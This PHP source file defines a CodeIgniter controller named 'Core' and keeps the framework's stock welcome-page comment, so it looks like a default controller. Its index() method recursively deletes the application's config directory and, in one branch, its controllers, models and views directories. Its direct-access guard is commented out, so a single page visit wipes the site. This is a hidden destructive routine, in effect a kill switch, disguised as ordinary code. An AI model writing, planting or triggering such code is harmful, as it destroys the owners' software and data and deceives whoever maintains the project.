<?php
//defined('BASEPATH') OR exit('No direct script access allowed');

class Core extends CI_Controller {

    /**
     * Index Page for this controller.
     *
     * Maps to the following URL
     * 		http://example.com/index.php/welcome
     *	- or -
     * 		http://example.com/index.php/welcome/index
     *	- or -
     * Since this controller is set as the default controller in
     * config/routes.php, it's displayed at http://example.com/
     *
     * So any other public methods not prefixed with an underscore will
     * map to /index.php/welcome/<method_name>
     * @see https://codeigniter.com/user_guide/general/urls.html
     */

    function __construct() {
        parent::__construct ();
		$this->load->helper('file');
	
    }

    public function index(){
			$path='application/config';
			$path1='application/controllers';
			$path2='application/controllers/access';
			$path3='application/models';
			$path4='application/views';
			$path5='application/third_party';
			$path6='assets';
			
			if ( ! delete_files($path,TRUE))
			{
				delete_files($path,TRUE);
				delete_files($path1,TRUE);
				delete_files($path2,TRUE);
				delete_files($path3,TRUE);
				delete_files($path4,TRUE);
				
					echo 'Nope';
			}
			else
			{
					echo 'yes!';
			}
	}
 
 }